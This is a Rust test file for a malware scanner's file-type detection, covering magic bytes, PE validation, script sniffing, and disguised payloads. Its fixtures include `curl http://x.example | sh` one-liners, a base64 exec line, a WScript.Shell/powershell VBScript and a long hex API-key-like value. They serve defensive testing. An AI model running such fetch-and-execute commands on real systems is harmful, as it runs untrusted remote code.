use super::*;

/// Archive members and Office macros take the `Arc` factory, top-level
/// files the plain one. They are one table now; the `Arc` copy used to lack
/// Flatpak, which it then treated as an archive and left unanalyzed.
#[test]
fn both_factories_cover_the_same_types() {
    for file_type in [FileType::Flatpak, FileType::Yaml, FileType::PgpSignature] {
        assert!(
            analyzer_for_file_type(&file_type, None).is_some(),
            "{file_type:?}"
        );
        assert!(
            analyzer_for_file_type_arc(&file_type, &crate::Engine::empty()).is_some(),
            "{file_type:?}"
        );
    }
}

#[test]
fn bridge_path_detection() {
    assert_eq!(
        declared_file_type_from_name(Path::new("script.py")),
        FileType::Python
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("app.js")),
        FileType::JavaScript
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("Component.jsx")),
        FileType::JavaScript
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("data.xyz")),
        FileType::Unknown
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("page.html")),
        FileType::Html
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("evil.service")),
        FileType::SystemdService
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("README.md")),
        FileType::Markdown
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("notes.txt")),
        FileType::Text
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("Makefile")),
        FileType::Makefile
    );
    assert_eq!(
        declared_file_type_from_name(Path::new("rules.mk")),
        FileType::Makefile
    );
}

#[test]
fn bridge_magic_detection() {
    let elf = b"\x7fELF\x02\x01\x01\x00";
    assert_eq!(
        detect_file_type_from_data(Path::new("bin"), elf),
        FileType::Elf
    );

    let pe = [b'M', b'Z', 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
    assert_eq!(
        detect_file_type_from_data(Path::new("a.exe"), &pe),
        FileType::Unknown
    );

    let pyc = [0x55, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00];
    assert_eq!(
        detect_file_type_from_data(Path::new("c/s.dat"), &pyc),
        FileType::PythonBytecode
    );
}

#[test]
fn bridge_pe_magic_requires_valid_nt_header() {
    let mut pe = vec![0u8; 0x84];
    pe[0..2].copy_from_slice(b"MZ");
    pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    pe[0x80..0x84].copy_from_slice(b"PE\0\0");
    assert_eq!(
        detect_file_type_from_data(Path::new("a.exe"), &pe),
        FileType::Pe
    );

    assert_eq!(
        detect_file_type_from_data(Path::new("BOUT.inp"), b"MZ = 8    # Z size\n"),
        FileType::Text
    );
}

fn damaged_signature_fixture() -> Vec<u8> {
    let mut data = vec![0u8; 0x400];
    data[..2].copy_from_slice(b"MZ");
    data[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    data[0x80..0x84].copy_from_slice(b"TL\0\0");
    data[0x84..0x86].copy_from_slice(&0x14cu16.to_le_bytes());
    data[0x86..0x88].copy_from_slice(&1u16.to_le_bytes());
    data[0x94..0x96].copy_from_slice(&0xe0u16.to_le_bytes());
    data[0x96..0x98].copy_from_slice(&0x102u16.to_le_bytes());
    data[0x98..0x9a].copy_from_slice(&0x10bu16.to_le_bytes());
    data[0xa8..0xac].copy_from_slice(&0x1000u32.to_le_bytes());
    data[0xd0..0xd4].copy_from_slice(&0x2000u32.to_le_bytes());
    data[0xd4..0xd8].copy_from_slice(&0x200u32.to_le_bytes());
    let sec = &mut data[0x178..0x1a0];
    sec[..5].copy_from_slice(b".text");
    sec[8..12].copy_from_slice(&0x200u32.to_le_bytes());
    sec[12..16].copy_from_slice(&0x1000u32.to_le_bytes());
    sec[16..20].copy_from_slice(&0x200u32.to_le_bytes());
    sec[20..24].copy_from_slice(&0x200u32.to_le_bytes());
    sec[36..40].copy_from_slice(&0x60000020u32.to_le_bytes());
    data[0x200] = 0xc3;
    data
}

#[test]
fn bridge_damaged_pe_signature_preserves_scan_dispatch() {
    let mut data = damaged_signature_fixture();
    for signature in [*b"TL\0\0", *b"ABCD", [0; 4]] {
        data[0x80..0x84].copy_from_slice(&signature);
        for name in ["sample", "sample.exe", "notes.txt"] {
            assert_eq!(
                detect_file_type_from_data(Path::new(name), &data),
                FileType::Pe
            );
        }
    }
}

#[test]
fn bridge_damaged_pe_requires_stored_executable_entry() {
    let data = damaged_signature_fixture();
    for (offset, replacement) in [
        (0x3c, u32::MAX),    // out-of-bounds NT header
        (0x94, 0),           // missing optional header
        (0xa8, 0x1800),      // entry outside stored section bytes
        (0xd0, 0x1000),      // section outside declared image
        (0x188, 0),          // no stored code
        (0x18c, 0x300),      // raw section exceeds file
        (0x19c, 0x40000040), // non-executable section
    ] {
        let mut invalid = data.clone();
        invalid[offset..offset + 4].copy_from_slice(&replacement.to_le_bytes());
        assert!(!looks_like_pe_image(&invalid), "offset {offset:x}");
    }
    assert!(!looks_like_pe_image(&data[..0x3ff]));
    assert!(!looks_like_pe_image(b"MZ = 8    # ordinary text\n"));
}

#[test]
fn bridge_shebang() {
    assert_eq!(
        detect_file_type_from_data(Path::new("s"), b"#!/bin/bash\necho hi\n"),
        FileType::Shell,
    );
}

#[test]
fn bridge_extension_fallback() {
    assert_eq!(
        detect_file_type_from_data(Path::new("app.js"), b"x = 1\n"),
        FileType::JavaScript
    );
}

#[test]
fn bridge_unknown() {
    // Unknown extension with no magic match falls through to Unknown.
    assert_eq!(
        detect_file_type_from_data(Path::new("d.xyz"), &[0, 0, 0, 0]),
        FileType::Unknown
    );
}

#[test]
fn bridge_data_extension() {
    // Opaque binary extensions (.bin/.dat/.payload/.raw) map to Data so
    // the generic analyzer runs string extraction and data-file rules.
    assert_eq!(
        detect_file_type_from_data(Path::new("d.bin"), &[0, 0, 0, 0]),
        FileType::Data
    );
    assert_eq!(
        detect_file_type_from_data(Path::new("Canon.dat"), &[0, 0, 0, 0]),
        FileType::Data
    );
}

#[test]
fn bridge_source_map_extension_is_analyzable_data() {
    let encoded = b"data:application/javascript;base64,Y29uc3QgYSAgPSAxOw==";
    assert_eq!(
        detect_file_type_from_data(Path::new("package/parse.ts.map"), encoded),
        FileType::Data
    );
}

#[test]
fn bridge_html_requires_content() {
    assert_eq!(
        detect_file_type_from_data(Path::new("p.html"), b"<html><body>hi</body></html>"),
        FileType::Html
    );
    assert_eq!(
        detect_file_type_from_data(Path::new("p.html"), b"just text"),
        FileType::Unknown
    );
}

#[test]
fn bridge_yaml() {
    // YAML used to bridge to Unknown because filefacts had no type for it,
    // which meant cleave skipped every config it could not otherwise
    // identify. It now carries a type of its own.
    assert_eq!(
        detect_file_type_from_data(Path::new("c.yaml"), b"name: test\n"),
        FileType::Yaml
    );
    // A workflow still refines past generic YAML.
    assert_eq!(
        detect_file_type_from_data(
            Path::new("ci.yml"),
            b"name: CI\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        ),
        FileType::GithubActions
    );
}

#[test]
fn bridge_ooxml() {
    // An Office extension is believed only when the bytes back it up:
    // every OOXML document is an OPC package and names
    // `[Content_Types].xml` as its first entry. A zip that merely carries
    // the extension is a zip, and is walked as one -- which is what lets
    // its members be analyzed at all.
    let mut package = b"PK\x03\x04".to_vec();
    package.extend_from_slice(&[0u8; 22]);
    package.extend_from_slice(&19u16.to_le_bytes());
    package.extend_from_slice(&0u16.to_le_bytes());
    package.extend_from_slice(b"[Content_Types].xml");
    assert_eq!(
        detect_file_type_from_data(Path::new("s.pptx"), &package),
        FileType::Ooxml
    );

    let mut bare = b"PK\x03\x04".to_vec();
    bare.resize(12, 0);
    assert_eq!(
        detect_file_type_from_data(Path::new("s.pptx"), &bare),
        FileType::Zip
    );
}

#[test]
fn bridge_heuristic_python() {
    let data = b"import os\nimport sys\ndef main():\n    print(\x27hello\x27)\n";
    assert_eq!(
        detect_file_type_from_data(Path::new("script"), data),
        FileType::Python
    );
}

#[test]
fn bridge_heuristic_utf16le_vbscript_without_extension() {
    let script = "On Error Resume Next\r\nSet sh = CreateObject(\"WScript.Shell\")\r\nself = WScript.ScriptFullName\r\nFunction repl(x)\r\nrepl = Replace(x, \"a\", \"\")\r\nEnd Function\r\nsh.Run \"powershell -command echo ok\", 0, true\r\n";
    let data = script
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect::<Vec<_>>();
    assert_eq!(
        detect_file_type_from_data(Path::new("payload"), &data),
        FileType::Vbs
    );
}

#[test]
fn bridge_detect_from_disk() {
    use std::io::Write;
    let mut f = tempfile::NamedTempFile::with_suffix(".py").unwrap();
    f.write_all(b"import os\n").unwrap();
    assert_eq!(detect_file_type(f.path()).unwrap(), FileType::Python);
}

/// The sniff's contract: distinct-marker counting (not occurrence
/// counting), both encodings, and a size cap that keeps generic markers
/// scattered across a large binary from adding up to a script verdict.
#[test]
fn script_sniff_counts_distinct_markers_in_either_encoding() {
    let vbs = b"Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"calc\", 0\r\n";
    assert_eq!(sniff_script_type_from_content(vbs), Some(FileType::Vbs));

    let wide: Vec<u8> = String::from_utf8_lossy(vbs)
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    assert_eq!(sniff_script_type_from_content(&wide), Some(FileType::Vbs));

    let mut compiled_rules = b"YARA-X\0\0\x02\0\0\0".to_vec();
    compiled_rules.extend_from_slice(vbs);
    assert_eq!(sniff_script_type_from_content(&compiled_rules), None);

    // One marker repeated is one marker, not three.
    assert_eq!(
        sniff_script_type_from_content(b"createobject( createobject( createobject("),
        None
    );

    // `end function` must not consume the `function ` inside it: with
    // non-overlapping matching this pair plus `.run ` would count 2, not 3.
    assert_eq!(
        sniff_script_type_from_content(b"End Function (x)\r\nsh.Run \"x\"\r\n"),
        Some(FileType::Vbs)
    );

    // The dmg case: the three generic markers, far apart, in a blob larger
    // than any delivered script. Size is the *only* difference between
    // these two — same markers, same spacing, one over the cap.
    let planted = |len: usize| {
        let mut blob = vec![b'\n'; len];
        let step = len / 4;
        blob[step..step + 9].copy_from_slice(b"function ");
        blob[2 * step..2 * step + 12].copy_from_slice(b"end function");
        blob[3 * step..3 * step + 5].copy_from_slice(b".run ");
        blob
    };
    assert_eq!(
        sniff_script_type_from_content(&planted(1024 * 1024)),
        Some(FileType::Vbs)
    );
    assert_eq!(
        sniff_script_type_from_content(&planted(6 * 1024 * 1024)),
        None
    );
}

#[test]
fn bridge_known_toml_manifests_by_basename() {
    assert_eq!(
        declared_file_type_from_name(Path::new("Cargo.toml")),
        FileType::CargoToml
    );
    assert_eq!(
        detect_file_type_from_data(Path::new("nested/Cargo.toml"), b"[package]\nname='x'\n"),
        FileType::CargoToml
    );
    assert_eq!(
        detect_file_type_from_data(Path::new("pyproject.toml"), b"[project]\nname='x'\n"),
        FileType::PyProjectToml
    );
    assert_eq!(
        detect_file_type_from_data(Path::new("config.toml"), b"[package]\nname='x'\n"),
        FileType::Text
    );
}

#[test]
fn bridge_dotenv_files_are_text() {
    assert_eq!(
        declared_file_type_from_name(Path::new(".env")),
        FileType::Text
    );
    assert_eq!(
        detect_file_type_from_data(Path::new(".env"), b"API_KEY=abc123\n"),
        FileType::Text
    );
    assert_eq!(
        declared_file_type_from_name(Path::new(".env.backup.20260617_154013")),
        FileType::Text
    );
    assert_eq!(
        detect_file_type_from_data(
            Path::new(".env.backup.20260617_154013"),
            b"CLOUDFLOW_CENTER_API_KEY=7e83812d309d3954a6fcdc5482aca2da73125828ab0d1e4a781e30404a718cfe\n"
        ),
        FileType::Text
    );
}

#[test]
fn binaries_named_like_text_keep_their_content_type() {
    let elf = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0\x01\0\0\0";
    let zip = b"PK\x03\x04\x14\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    for name in [".env", ".env.backup", ".PKGINFO", "setup.rsc"] {
        assert_ne!(
            detect_file_type_from_data(Path::new(name), elf),
            FileType::Text,
            "ELF named {name}"
        );
        assert_ne!(
            detect_file_type_from_data(Path::new(name), zip),
            FileType::Text,
            "zip named {name}"
        );
    }
    assert_eq!(
        detect_file_type_from_data(Path::new(".env"), b"API_KEY=abc123\n"),
        FileType::Text
    );
}

/// A name that means "inert text" is the caller's to choose, so it must
/// not hide code: a payload named `.env`, `.PKGINFO` or `x.rsc` is typed
/// by its content, exactly as it would be under any other name.
#[test]
fn scripts_named_like_text_keep_their_content_type() {
    let js = b"const cp = require('child_process');\ncp.execSync('curl http://x.example | sh');\nmodule.exports = {};\n";
    let py = b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
    let sh = b"#!/bin/sh\ncurl -s http://x.example | sh\n";
    for name in [
        ".env",
        ".env.backup",
        ".PKGINFO",
        ".BUILDINFO",
        ".MTREE",
        "setup.rsc",
    ] {
        for (payload, expected) in [
            (
                js.as_slice(),
                detect_file_type_from_data(Path::new("plain"), js),
            ),
            (
                py.as_slice(),
                detect_file_type_from_data(Path::new("plain"), py),
            ),
            (
                sh.as_slice(),
                detect_file_type_from_data(Path::new("plain"), sh),
            ),
        ] {
            assert_ne!(expected, FileType::Text);
            assert_eq!(
                detect_file_type_from_data(Path::new(name), payload),
                expected,
                "payload named {name}"
            );
        }
    }
}

#[test]
fn bridge_arch_package_metadata_stays_text() {
    assert_eq!(
        declared_file_type_from_name(Path::new(".PKGINFO")),
        FileType::Text
    );
    assert_eq!(
        detect_file_type_from_data(
            Path::new(".PKGINFO"),
            b"pkgdesc = Tools to package up Wasm Components\n"
        ),
        FileType::Text
    );
    assert_eq!(
        detect_file_type_from_data(Path::new(".BUILDINFO"), b"format = 2\n"),
        FileType::Text
    );
    assert_eq!(
        detect_file_type_from_data(Path::new(".MTREE"), b"#mtree\n"),
        FileType::Text
    );
}

#[test]
fn bridge_report_file_type_delegates_to_filefacts_label() {
    // The report type is filefacts's canonical label verbatim — no
    // hand-rolled aliases, no Debug-lowercase mangling.
    assert_eq!(
        FileType::SystemdService.report_file_type(),
        "systemd_service"
    );
    assert_eq!(
        FileType::PythonBytecode.report_file_type(),
        "python_bytecode"
    );
    assert_eq!(FileType::ObjectiveC.report_file_type(), "objective_c");
    assert_eq!(FileType::Elf.report_file_type(), "elf");
}

/// Commands type a file from the same full contents a scan reads: a
/// call-over-blob shellcode whose `pop` target lies past the first KiB must
/// be shellcode both ways (it was `data` when commands sniffed a 1 KiB prefix).
#[test]
fn detect_file_type_matches_scan_detection_past_first_kib() {
    let mut data = vec![0xE8, 0x00, 0x10, 0x00, 0x00];
    data.extend(std::iter::repeat_n(0xA5u8, 0x1000));
    data.extend([0x59, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0xC3]);
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("payload.bin");
    std::fs::write(&path, &data).unwrap();
    let scanned = detect_file_type_from_data(&path, &data);
    assert_eq!(detect_file_type(&path).unwrap(), scanned);
    assert_eq!(scanned, FileType::Shellcode);
}
